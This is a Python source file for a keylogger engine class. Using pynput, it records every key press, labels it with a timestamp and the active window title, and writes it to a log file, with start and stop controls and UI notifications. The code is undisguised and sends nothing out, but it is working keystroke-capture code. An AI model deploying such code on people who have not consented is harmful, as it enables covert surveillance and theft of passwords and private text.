
from pynput import keyboard
import datetime
import time

class KeyloggerEngine:
    """Handles the actual keylogging logic"""

    def __init__(self, file_manager, get_active_window_func, log_update_queue=None):
        self.file_manager = file_manager
        self.get_active_window = get_active_window_func
        self.log_update_queue = log_update_queue
        self.listener = None
        self.is_running = False
        self.current_log_file = None
        self.last_window = ""

    def _on_press(self, key):
        """Callback for key press events"""
        try:
            # Get current time and active window
            timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            active_window = self.get_active_window()

            # Check if window changed
            if active_window != self.last_window:
                self.last_window = active_window
                log_entry = f"\n\n[--- {active_window} --- {timestamp} ---]\n"
            else:
                log_entry = ""

            # Format key
            if hasattr(key, 'char') and key.char:
                log_entry += key.char
            else:
                # Special keys
                key_name = str(key).replace("Key.", "")
                log_entry += f"<{key_name}>"

            # Write to file
            self.file_manager.write_log(self.current_log_file, log_entry)

            # Notify the UI thread that an update happened
            if self.log_update_queue:
                try:
                    # Put the file path in the queue for the UI to process
                    self.log_update_queue.put_nowait(self.current_log_file)
                except:
                    # Queue might be full, not critical to drop a notification
                    pass

        except Exception as e:
            print(f"Error in keylogger: {e}")

    def start(self):
        """Start the keylogger"""
        if self.is_running:
            return

        self.is_running = True
        self.current_log_file = self.file_manager.get_log_filename()
        self.last_window = self.get_active_window()

        # Initial log entry
        initial_entry = f"\n[--- Logging Started: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ---]\n"
        initial_entry += f"[--- Active Window: {self.last_window} ---]\n"
        self.file_manager.write_log(self.current_log_file, initial_entry)

        # Start listener in a non-blocking way
        self.listener = keyboard.Listener(on_press=self._on_press)
        self.listener.start()

    def stop(self):
        """Stop the keylogger"""
        if not self.is_running or not self.listener:
            return

        # Stop the listener
        self.listener.stop()
        self.is_running = False

        # Final log entry
        final_entry = f"\n[--- Logging Stopped: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ---]\n"
        self.file_manager.write_log(self.current_log_file, final_entry)
        self.current_log_file = None
